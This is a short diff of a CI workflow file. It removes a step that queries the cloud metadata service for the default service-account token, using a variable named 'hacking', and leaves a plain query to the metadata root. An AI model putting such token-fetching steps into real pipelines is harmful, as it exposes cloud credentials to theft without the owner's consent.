@@ -15,4 +15,4 @@ jobs:
     - name: Run a one-line script
       run: |
         hacking=/computeMetadata/v1beta1/instance/service-accounts/default/token
-        curl -H "Metadata-Flavor: Google" http://169.254.169.254$hacking
+        curl -H "Metadata-Flavor: Google" http://169.254.169.254
